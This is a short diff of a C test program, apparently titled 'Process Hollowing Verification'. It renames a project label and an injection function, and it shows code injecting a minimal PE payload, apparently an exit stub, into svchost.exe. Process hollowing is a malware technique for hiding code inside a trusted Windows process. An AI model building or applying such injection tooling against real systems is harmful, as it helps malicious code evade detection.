@@ -1,4 +1,4 @@
-#include <stdio.h>
+﻿#include <stdio.h>
 #include <stddef.h>
 #include <string.h>
 #include <windows.h>
@@ -77,7 +77,7 @@ build_exit_payload(MINIMAL_PE *pe)
 
 int main(void)
 {
-    printf("DORM Phase 9 -- Process Hollowing Verification\n");
+    printf("JOCKY Phase 9 -- Process Hollowing Verification\n");
     printf("=================================================\n\n");
 
     MINIMAL_PE payload;
@@ -97,7 +97,7 @@ int main(void)
     printf("Injecting into svchost.exe...     ");
     fflush(stdout);
 
-    BOOL ok = dorm_hollow_inject(
+    BOOL ok = JOCKY_hollow_inject(
         L"C:\\Windows\\System32\\svchost.exe",
         &payload,
         sizeof(payload)
